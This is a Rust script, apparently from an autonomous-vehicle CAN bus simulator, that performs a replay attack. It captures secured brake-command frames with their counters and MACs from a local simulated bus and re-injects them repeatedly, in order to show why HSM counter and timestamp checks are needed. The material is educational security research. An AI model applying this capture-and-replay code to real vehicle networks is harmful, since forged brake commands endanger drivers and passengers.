use autonomous_vehicle_sim::hsm::SecuredCanFrame;
use autonomous_vehicle_sim::network::BusClient;
use autonomous_vehicle_sim::types::can_ids;
/// ATTACK SCENARIO: Replay Attack
///
/// This script demonstrates a replay attack where an attacker captures
/// legitimate CAN frames and retransmits them later. In this scenario,
/// we capture brake commands and replay them at inappropriate times,
/// which could cause unexpected braking.
///
/// PURPOSE: Educational - demonstrates why timestamps/counters are needed
/// DEFENSE: HSM with message counters or timestamps can detect replayed frames
use colored::*;
use std::collections::VecDeque;
use std::time::Duration;

const BUS_ADDRESS: &str = "127.0.0.1:9000";
const ATTACKER_NAME: &str = "ATTACKER_REPLAY";
const CAPTURE_DURATION_SEC: u64 = 10;
const REPLAY_DELAY_SEC: u64 = 3;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!("{}", "     ATTACK: Replay Attack             ".red().bold());
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!();
    println!(
        "{}",
        "⚠️  WARNING: This is a security research tool".yellow()
    );
    println!("{}", "⚠️  Only use on authorized test systems".yellow());
    println!();

    println!("{} Connecting to CAN bus...", "→".red());
    let client = BusClient::connect(BUS_ADDRESS, ATTACKER_NAME.to_string()).await?;
    println!("{} Connected as {}!", "✓".red().bold(), ATTACKER_NAME);
    println!();

    let (mut reader, mut writer) = client.split();

    // Phase 1: Capture frames
    println!("{}", "Phase 1: Capturing CAN frames".red().bold());
    println!(
        "{} Monitoring bus for {} seconds...",
        "→".red(),
        CAPTURE_DURATION_SEC
    );
    println!(
        "{} Capturing BRAKE_COMMAND frames (CAN ID 0x300)",
        "→".red()
    );
    println!();

    let mut captured_frames: VecDeque<SecuredCanFrame> = VecDeque::new();
    let capture_start = tokio::time::Instant::now();

    while capture_start.elapsed().as_secs() < CAPTURE_DURATION_SEC {
        match tokio::time::timeout(Duration::from_millis(100), reader.receive_message()).await {
            Ok(Ok(msg)) => {
                if let autonomous_vehicle_sim::network::NetMessage::SecuredCanFrame(secured) = msg {
                    // Capture secured brake commands with their original counter/MAC
                    if secured.can_id == can_ids::BRAKE_COMMAND {
                        println!(
                            "{} Captured secured brake command from {} (counter: {})",
                            "📹".red(),
                            secured.source.bright_black(),
                            secured.session_counter
                        );
                        captured_frames.push_back(secured);

                        if captured_frames.len() >= 50 {
                            break;
                        }
                    }
                }
            }
            Ok(Err(_)) => break,
            Err(_) => continue,
        }
    }

    println!();
    println!(
        "{} Captured {} brake command frames",
        "✓".red().bold(),
        captured_frames.len()
    );

    if captured_frames.is_empty() {
        println!("{} No brake commands captured. Exiting.", "✗".red());
        return Ok(());
    }

    // Phase 2: Wait before replay
    println!();
    println!("{}", "Phase 2: Preparing replay attack".red().bold());
    println!(
        "{} Waiting {} seconds before replay...",
        "→".red(),
        REPLAY_DELAY_SEC
    );
    tokio::time::sleep(Duration::from_secs(REPLAY_DELAY_SEC)).await;

    // Phase 3: Replay captured frames
    println!();
    println!("{}", "Phase 3: Replaying captured frames".red().bold());
    println!("{} Injecting old brake commands into bus", "→".red());
    println!();

    let mut replay_count = 0;
    let max_replays = 100;

    while let Some(frame) = captured_frames.pop_front() {
        // Replay the secured frame with its original counter and MAC
        // This will trigger replay detection on the receiving ECU
        writer.send_secured_frame(frame.clone()).await?;

        replay_count += 1;
        println!(
            "{} Replayed secured frame #{} (counter: {}, from: {})",
            "⚡".red(),
            replay_count,
            frame.session_counter,
            frame.source.bright_black()
        );

        tokio::time::sleep(Duration::from_millis(100)).await;

        // Exit after max replays to allow automated tests to complete
        if replay_count >= max_replays {
            break;
        }

        // Add captured frame back to queue for continuous replay
        captured_frames.push_back(frame);
    }

    Ok(())
}
